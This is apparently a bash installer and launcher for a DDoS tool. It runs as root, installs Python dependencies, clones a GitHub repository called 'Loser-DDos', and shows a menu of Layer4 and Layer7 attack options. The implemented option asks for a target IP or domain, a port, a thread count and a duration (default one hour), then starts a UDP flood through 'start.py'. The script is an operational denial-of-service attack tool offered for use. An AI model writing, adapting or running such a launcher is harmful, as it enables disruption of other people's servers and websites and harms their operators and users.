#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  echo "请使用 root 用户执行此脚本！"
  echo "你可以使用 'sudo -i' 进入 root 用户模式。"
  exit 1
fi

if ! command -v apt && ! command -v yum; then
  echo "Unsupported package manager."
  exit 1
fi

apt update

commands=("python3" "python3-pip" "git")
package_manager=""
install_command=""

if command -v apt &>/dev/null; then
  package_manager="apt"
  install_command="apt install -y"
elif command -v yum &>/dev/null; then
  package_manager="yum"
  install_command="yum install -y"
fi

install_missing_commands() {
  for cmd in "${commands[@]}"; do
    if ! command -v "$cmd" &>/dev/null; then
      echo "Installing $cmd..."
      sudo $install_command "$cmd"
      if [ $? -eq 0 ]; then
        echo "$cmd installed successfully."
      else
        echo "Failed to install $cmd."
      fi
    else
      echo "$cmd is already installed."
    fi
  done
}

install1() {
  python3 -m pip install --upgrade pip
  python3 -m pip install --upgrade cfscrape==2.1.1
  python3 -m pip install --upgrade certifi==2021.10.8
  python3 -m pip install --upgrade dnspython>=2.2.0
  python3 -m pip install --upgrade requests==2.27.1
  python3 -m pip install --upgrade impacket==0.9.23
  python3 -m pip install --upgrade psutil>=5.9.0
  python3 -m pip install --upgrade icmplib>=2.1.1
  python3 -m pip install --upgrade git+https://github.com/seagullz4/PyRoxy.git
  python3 -m pip install --upgrade yarl~=1.7.2
  python3 -m pip install cloudscraper
  git clone https://github.com/seagullz4/Loser-DDos.git
  cd Loser-DDos || exit
  if [ $? -ne 0 ]; then
    sudo apt -y update && sudo apt -y install curl wget libcurl4 libssl-dev python3 python3-pip make cmake automake autoconf m4 build-essential git && git clone https://github.com/seagullz4/Loser-DDos.git && cd lo* && pip3 install -r requirements.txt
  fi
}

install_missing_commands

install1

echo "1. Layer4 (Server/Home)"
echo "2. Layer7 (Website)"
echo "3. 单糖"
echo "4. 多糖"
echo "5. 果糖"

read -p "输入操作编号 (1/2/3/4/5): " choice

case $choice in
   1)
     
     cd /root/Loser-DDos/
     
          echo "请输入ip地址或域名："
     read -r ip

      if [[ $ip =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ || $ip =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
          echo "OK的了"
      else
          echo "ip地址或域名无效，请重新输入"
          exit 1
      fi

      read -p "请输入端口号（回车默认为53）：" port
      port=${port:-53}

      if [[ $port =~ ^[1-9][0-9]*$ ]]; then
         echo "端口号有效，使用默认值：$port"
      else
         echo "端口号无效，请重新输入"
         exit 4
      fi

      read -p "请输入线程数（默认为1）：" xc
      xc=${xc:-1}
      if [[ $xc =~ ^[1-9][0-9]*$ ]]; then
         echo "线程数有效"
      else
         echo "线程数无效，请重新输入"
         exit 2
      fi

      read -p "请输入时间（单位:秒,回车默认3600）：" time
      time=${time:-3600}
      if [[ $time =~ ^[1-9][0-9]*$ ]]; then
         echo "时间有效"
      else
         echo "时间无效，请重新输入"
         exit 3
      fi

      python3 start.py udp "$ip":"$port" "$xc" "$time" true
      exit
      ;;

   2|3|4|5)
      echo "正在测试中"
      exit
      ;;

   *)
      echo "无效的选择"
      exit 1
      ;;
esac